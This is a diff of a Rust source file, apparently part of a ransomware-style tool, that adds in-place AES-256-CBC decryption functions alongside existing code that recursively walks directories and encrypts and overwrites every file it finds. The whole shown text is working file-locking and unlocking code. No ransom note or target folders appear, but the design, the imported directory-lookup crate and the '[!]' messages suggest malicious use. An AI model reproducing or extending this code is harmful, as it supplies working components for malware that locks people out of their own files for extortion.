@@ -2,18 +2,20 @@ use std::fs::{self, File};
 use std::io::{Read, Write};
 use std::path::{Path, PathBuf};
 use aes::Aes256;
-use cbc::Encryptor;
+use cbc::{Encryptor, Decryptor}; // CBC mode encryptor
 use cipher::{
     block_padding::Pkcs7,
     BlockEncryptMut,
+    BlockDecryptMut,
     KeyIvInit,
 };
 use dirs;
 
 type Aes256CbcEnc = Encryptor<Aes256>;
+type Aes256CbcDec = Decryptor<Aes256>;
 
 /// Encrypts a file using AES-256-CBC and overwrites the original.
-pub fn encrypt_file(filepath: &Path, key: &[u8; 32], iv: &[u8; 16]) {
+fn encrypt_file(filepath: &Path, key: &[u8; 32], iv: &[u8; 16]) {
     if let Ok(mut file) = File::open(filepath) {
         let mut buffer = Vec::new();
         if file.read_to_end(&mut buffer).is_ok() {
@@ -36,6 +38,24 @@ pub fn encrypt_file(filepath: &Path, key: &[u8; 32], iv: &[u8; 16]) {
     }
 }
 
+/// Decrypt a single file in-place
+fn decrypt_file(filepath: &Path, key: &[u8; 32], iv: &[u8; 16]) {
+    if let Ok(mut file) = File::open(filepath) {
+        let mut buffer = Vec::new();
+        if file.read_to_end(&mut buffer).is_ok() {
+            let cipher = Aes256CbcDec::new(key.into(), iv.into());
+            match cipher.decrypt_padded_mut::<Pkcs7>(&mut buffer) {
+                Ok(decrypted) => {
+                    if let Ok(mut out_file) = File::create(filepath) {
+                        let _ = out_file.write_all(decrypted);
+                    }
+                }
+                Err(err) => eprintln!("[!] Decryption failed for {:?}: {}", filepath, err),
+            }
+        }
+    }
+}
+
 /// Recursively encrypts all files in a given directory.
 pub fn encrypt_directory(path: &Path, key: &[u8; 32], iv: &[u8; 16]) {
     if let Ok(entries) = fs::read_dir(path) {
@@ -45,6 +65,20 @@ pub fn encrypt_directory(path: &Path, key: &[u8; 32], iv: &[u8; 16]) {
                 encrypt_directory(&path, key, iv); // recurse into subdirs
             } else {
                 encrypt_file(&path, key, iv);
+            }
+        }
+    }
+}
+
+/// Decrypt all files in a directory recursively
+pub fn decrypt_directory(path: &Path, key: &[u8; 32], iv: &[u8; 16]) {
+    if let Ok(entries) = fs::read_dir(path) {
+        for entry in entries.flatten() {
+            let path = entry.path();
+            if path.is_dir() {
+                decrypt_directory(&path, key, iv); // recurse into subdirs
+            } else {
+                decrypt_file(&path, key, iv);
             }
         }
     }
